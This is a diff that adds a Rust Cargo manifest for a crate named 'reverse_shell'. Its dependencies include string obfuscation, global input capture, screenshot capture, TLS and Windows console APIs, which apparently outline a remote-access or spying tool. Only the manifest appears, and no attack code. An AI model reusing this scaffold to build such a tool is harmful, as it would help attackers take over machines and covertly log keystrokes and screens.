@@ -1,0 +1,18 @@
+[package]
+name = "reverse_shell"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+rustls = { version = "0.23", features = ["std"] }
+rustls-pemfile = "2.0"
+webpki-roots = "0.26"
+obfstr = "0.3"
+rdev = "0.5"
+screenshots = "0.8"
+image = "0.25"
+lazy_static = "1.4"
+rand = "0.8"
+
+[target.'cfg(windows)'.dependencies]
+windows = { version = "0.58", features = ["Win32_System_Console", "Win32_Foundation"] }
